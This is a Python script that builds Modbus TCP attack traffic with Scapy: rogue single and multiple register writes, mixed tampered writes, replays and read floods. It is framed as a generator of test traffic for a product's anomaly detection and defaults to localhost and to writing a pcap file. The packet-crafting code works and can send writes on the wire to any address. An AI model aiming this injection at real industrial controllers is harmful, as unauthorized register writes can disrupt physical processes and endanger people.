"""
Scapy-based Modbus TCP packet injection for testing anomaly detection.

Crafts and sends Modbus TCP packets with tampered function codes, rogue
write operations, and replay attacks to trigger NetScope Desktop's agent
detection logic.

Modes:
  rogue_write    — send FC 6 (Write Single Register) from an unauthorized host
  fc_tamper      — craft packets with modified function codes
  replay_attack  — capture-and-replay Modbus transactions
  flood          — rapid-fire read requests to test rate anomaly detection
  pcap_only      — write crafted packets to a .pcap file (no network send)

Usage:
  # Write crafted attack packets to a pcap file (no admin required)
  python scapy_modbus_inject.py --mode pcap_only --count 50 --pcap-output attack.pcap

  # Send rogue writes to a Modbus slave (requires admin/raw socket)
  python scapy_modbus_inject.py --target-ip 127.0.0.1 --target-port 5020 \\
      --mode rogue_write --count 10

Dependencies:
  pip install scapy>=2.5
"""
from __future__ import annotations

import argparse
import random
import struct
import sys
import time
from pathlib import Path
from typing import Optional

try:
    from scapy.all import IP, TCP, Raw, Ether, wrpcap, sendp, send, conf
except ImportError:
    print("Error: scapy is required. Install with: pip install scapy>=2.5")
    sys.exit(1)


# ── Modbus MBAP + PDU constants ──────────────────────────────────────────────

MBAP_HEADER_LEN = 7   # transaction_id(2) + protocol_id(2) + length(2) + unit_id(1)


def _mbap_header(transaction_id: int, unit_id: int, pdu_len: int) -> bytes:
    """Build a Modbus MBAP header."""
    length = pdu_len + 1  # +1 for unit_id byte
    return struct.pack(">HHHB", transaction_id, 0, length, unit_id)


# ── Packet crafters ──────────────────────────────────────────────────────────

def craft_modbus_read_request(
    dst_ip: str, dst_port: int,
    unit_id: int = 1, register_addr: int = 0, count: int = 10,
    transaction_id: int = 1,
    src_port: int = 0,
):
    """Craft a FC 3 (Read Holding Registers) request packet."""
    pdu = struct.pack(">BHH", 3, register_addr, count)
    mbap = _mbap_header(transaction_id, unit_id, len(pdu))
    payload = mbap + pdu

    src = src_port or random.randint(49152, 65535)
    pkt = IP(dst=dst_ip) / TCP(sport=src, dport=dst_port, flags="PA") / Raw(load=payload)
    return pkt


def craft_rogue_write(
    dst_ip: str, dst_port: int,
    unit_id: int = 1, register_addr: int = 0, value: int = 0xDEAD,
    transaction_id: int = 1,
    src_port: int = 0,
):
    """Craft a FC 6 (Write Single Register) request from an 'unauthorized' source."""
    pdu = struct.pack(">BHH", 6, register_addr, value)
    mbap = _mbap_header(transaction_id, unit_id, len(pdu))
    payload = mbap + pdu

    src = src_port or random.randint(49152, 65535)
    pkt = IP(dst=dst_ip) / TCP(sport=src, dport=dst_port, flags="PA") / Raw(load=payload)
    return pkt


def craft_write_multiple_registers(
    dst_ip: str, dst_port: int,
    unit_id: int = 1, start_addr: int = 0,
    values: Optional[list[int]] = None,
    transaction_id: int = 1,
):
    """Craft a FC 16 (Write Multiple Registers) request."""
    if values is None:
        values = [0xBEEF, 0xCAFE, 0xFACE]
    count = len(values)
    byte_count = count * 2
    pdu = struct.pack(">BHH B", 16, start_addr, count, byte_count)
    for v in values:
        pdu += struct.pack(">H", v & 0xFFFF)
    mbap = _mbap_header(transaction_id, unit_id, len(pdu))
    payload = mbap + pdu

    src = random.randint(49152, 65535)
    pkt = IP(dst=dst_ip) / TCP(sport=src, dport=dst_port, flags="PA") / Raw(load=payload)
    return pkt


def craft_modbus_exception_response(
    dst_ip: str, dst_port: int,
    unit_id: int = 1, original_fc: int = 3, exception_code: int = 4,
    transaction_id: int = 1,
):
    """Craft a Modbus exception response (FC | 0x80 + exception code)."""
    pdu = struct.pack(">BB", original_fc | 0x80, exception_code)
    mbap = _mbap_header(transaction_id, unit_id, len(pdu))
    payload = mbap + pdu

    src = random.randint(49152, 65535)
    pkt = IP(dst=dst_ip) / TCP(sport=src, dport=dst_port, flags="PA") / Raw(load=payload)
    return pkt


# ── Campaign runners ─────────────────────────────────────────────────────────

def run_rogue_write_campaign(
    target_ip: str, target_port: int, count: int, interval: float,
    unit_id: int = 1,
) -> list:
    """Generate rogue FC 6 write packets."""
    packets = []
    for i in range(count):
        register_addr = random.randint(0, 99)
        value = random.randint(0, 65535)
        pkt = craft_rogue_write(
            target_ip, target_port,
            unit_id=unit_id, register_addr=register_addr, value=value,
            transaction_id=i + 1,
        )
        packets.append(pkt)
    return packets


def run_fc_tamper_campaign(
    target_ip: str, target_port: int, count: int,
    original_fc: int = 3, tampered_fc: int = 6,
) -> list:
    """Generate packets with tampered function codes."""
    packets = []
    for i in range(count):
        # Alternate between normal reads and tampered writes
        if i % 3 == 0:
            pkt = craft_modbus_read_request(
                target_ip, target_port, transaction_id=i + 1,
            )
        else:
            pkt = craft_rogue_write(
                target_ip, target_port,
                register_addr=random.randint(0, 49),
                value=random.randint(0, 1000),
                transaction_id=i + 1,
            )
        packets.append(pkt)
    return packets


def run_flood_campaign(
    target_ip: str, target_port: int, count: int,
) -> list:
    """Generate rapid-fire read requests to test rate anomaly detection."""
    packets = []
    for i in range(count):
        pkt = craft_modbus_read_request(
            target_ip, target_port,
            register_addr=0, count=125,  # max single read
            transaction_id=i + 1,
        )
        packets.append(pkt)
    return packets


def run_replay_campaign(
    target_ip: str, target_port: int, count: int,
) -> list:
    """Generate repeated identical transactions (replay attack pattern)."""
    # Craft one transaction and repeat it
    base = craft_modbus_read_request(
        target_ip, target_port,
        register_addr=0, count=10, transaction_id=42,
    )
    return [base] * count


# ── Main ─────────────────────────────────────────────────────────────────────

_CAMPAIGNS = {
    "rogue_write": run_rogue_write_campaign,
    "fc_tamper": run_fc_tamper_campaign,
    "flood": run_flood_campaign,
    "replay_attack": run_replay_campaign,
    "pcap_only": run_rogue_write_campaign,  # same craft, just write to file
}


def main():
    parser = argparse.ArgumentParser(
        description="Scapy-based Modbus TCP packet injection for anomaly detection testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  rogue_write    Send FC 6 writes from unauthorized source
  fc_tamper      Mix normal reads with tampered writes
  flood          Rapid-fire read requests
  replay_attack  Repeat identical transactions
  pcap_only      Write crafted packets to .pcap (no admin needed)

Example:
  python scapy_modbus_inject.py --mode pcap_only --count 50 --pcap-output attack.pcap
  python scapy_modbus_inject.py --mode rogue_write --target-ip 127.0.0.1 --count 10
""",
    )
    parser.add_argument("--target-ip", default="127.0.0.1")
    parser.add_argument("--target-port", type=int, default=5020)
    parser.add_argument("--mode", choices=list(_CAMPAIGNS.keys()), default="pcap_only")
    parser.add_argument("--count", type=int, default=50)
    parser.add_argument("--interval", type=float, default=0.1,
                        help="Seconds between sends (ignored in pcap_only mode)")
    parser.add_argument("--unit-id", type=int, default=1)
    parser.add_argument("--pcap-output", default="",
                        help="Save packets to .pcap file instead of/in addition to sending")
    parser.add_argument("--interface", default=None,
                        help="Network interface for sending (default: auto)")

    args = parser.parse_args()

    campaign_fn = _CAMPAIGNS[args.mode]
    print(f"[inject] Mode: {args.mode}, Target: {args.target_ip}:{args.target_port}, Count: {args.count}")

    # Generate packets
    if args.mode in ("fc_tamper", "flood", "replay_attack"):
        packets = campaign_fn(args.target_ip, args.target_port, args.count)
    else:
        packets = campaign_fn(
            args.target_ip, args.target_port, args.count,
            interval=args.interval, unit_id=args.unit_id,
        )

    print(f"[inject] Crafted {len(packets)} packets.")

    # Save to pcap if requested
    pcap_output = args.pcap_output
    if args.mode == "pcap_only" and not pcap_output:
        pcap_output = "modbus_attack.pcap"

    if pcap_output:
        # Add Ether headers for pcap compatibility
        pcap_packets = [Ether() / pkt for pkt in packets]
        wrpcap(pcap_output, pcap_packets)
        print(f"[inject] Saved {len(pcap_packets)} packets to {pcap_output}")
        if args.mode == "pcap_only":
            print("[inject] pcap_only mode — not sending on wire.")
            return

    # Send packets on the wire
    print(f"[inject] Sending {len(packets)} packets (interval={args.interval}s)...")
    for i, pkt in enumerate(packets):
        try:
            send(pkt, verbose=0)
        except PermissionError:
            print("[inject] Error: sending raw packets requires admin/root privileges.")
            print("[inject] Use --mode pcap_only to write to a file instead.")
            sys.exit(1)
        except Exception as e:
            print(f"[inject] Send error on packet {i}: {e}")
            continue
        if args.interval > 0:
            time.sleep(args.interval)

    print(f"[inject] Done. Sent {len(packets)} packets.")


if __name__ == "__main__":
    main()
